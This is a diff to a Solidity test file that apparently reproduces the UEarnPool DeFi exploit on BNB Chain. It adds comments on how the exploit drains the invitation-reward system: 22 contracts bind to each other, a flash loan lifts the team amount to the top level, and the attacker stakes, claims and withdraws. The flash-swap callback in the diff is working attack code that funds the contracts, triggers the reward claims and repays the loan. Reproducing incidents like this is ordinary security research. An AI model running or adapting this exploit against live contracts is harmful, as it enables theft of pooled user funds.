@@ -9,6 +9,22 @@ import "./interface.sol";
 // @Tx
 // https://bscscan.com/tx/0xb83f9165952697f27b1c7f932bcece5dfa6f0d2f9f3c3be2bb325815bfd834ec
 // https://bscscan.com/tx/0x824de0989f2ce3230866cb61d588153e5312151aebb1e905ad775864885cd418
+// @Summary
+// The key is to obtain invitation rewards, create 22 contracts, bind each other, first stake a large amount of usdt, make teamamont reach the standard of _levelConfigs[3], stake in turn, and finally claim rewards
+// Reward Calculation: claimTeamReward() levelConfig 
+//                  if (_userInfos[account].levelClaimed[i] == 0) {
+//                     if (i == 0) {
+//                         levelReward = levelConfig.teamAmount * levelConfig.rewardRate / _feeDivFactor;
+//                     } else {
+//                         levelReward = (levelConfig.teamAmount - _levelConfigs[i - 1].teamAmount) * levelConfig.rewardRate / _feeDivFactor;
+//                     }
+//                     pendingReward += levelReward;
+// _levelConfigs[0] = LevelConfig(100, 300000 * amountUnit, 3000 * amountUnit);         rewardRate; teamAmount; amount;
+// _levelConfigs[1] = LevelConfig(300, 600000 * amountUnit, 7000 * amountUnit);
+// _levelConfigs[2] = LevelConfig(500, 1200000 * amountUnit, 10000 * amountUnit);
+// _levelConfigs[3] = LevelConfig(1000, 2400000 * amountUnit, 20000 * amountUnit);
+// _feeDivFactor = 10000
+// rewrad: 162_000 = 1_200_000 * 0.1 + 600_000 * 0.05 + 300_000 * 0.03 + 300_000 * 0.01
 
 interface UEarnPool{
     function bindInvitor(address invitor) external;
@@ -66,28 +82,27 @@ contract ContractTest is DSTest{
 
     function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
         uint len = contractList.length;
-        // teamAmount > 2_400_000
+        // LevelConfig[3].teamAmount : 2_400_000
         USDT.transfer(contractList[len - 1], 2_400_000 * 1e18);
         (bool success1, ) = contractList[len - 1].call(abi.encodeWithSignature("stakeAndClaimReward(uint256)", 2_400_000 * 1e18));
         require(success1);
         for(uint i = len - 2; i > 4; i--){
-            USDT.transfer(contractList[i], 20_000 * 1e18);
+            USDT.transfer(contractList[i], 20_000 * 1e18); // LevelConfig[3].Amount : 20_000
             USDT.balanceOf(address(this));
-            // 162000 - 20000 + 1500
+            // 162000 - 20000 + 1500, 1500 is the reduce amount of _addInviteReward(), claim remaining USDT when USDT amount in contract less than 162_000,
             if(USDT.balanceOf(address(Pool)) < 143_500 * 1e18){
                 USDT.transfer(address(Pool), 143_500 * 1e18 - USDT.balanceOf(address(Pool)));
             }
-            (bool success1, ) = contractList[i].call(abi.encodeWithSignature("stakeAndClaimReward(uint256)", 20_000 * 1e18)); // amount > 20_000
+            (bool success1, ) = contractList[i].call(abi.encodeWithSignature("stakeAndClaimReward(uint256)", 20_000 * 1e18)); // LevelConfig[3].Amount : 20_000
             require(success1);
             (bool success2, ) = contractList[i].call(abi.encodeWithSignature("withdraw(address)", address(this)));
             require(success2);
         }
-        contractList[0].call(abi.encodeWithSignature("withdraw(address)", address(this)));
+        contractList[0].call(abi.encodeWithSignature("withdraw(address)", address(this))); // claim the reward from _addInviteReward() 
         contractList[1].call(abi.encodeWithSignature("withdraw(address)", address(this)));
         contractList[2].call(abi.encodeWithSignature("withdraw(address)", address(this)));
         contractList[3].call(abi.encodeWithSignature("withdraw(address)", address(this)));
         contractList[4].call(abi.encodeWithSignature("withdraw(address)", address(this)));
-        USDT.balanceOf(address(Pool));
         uint borrowAmount = 2_420_000 * 1e18;
         USDT.transfer(address(Pair), borrowAmount * 10000 / 9975 + 1000);
     }
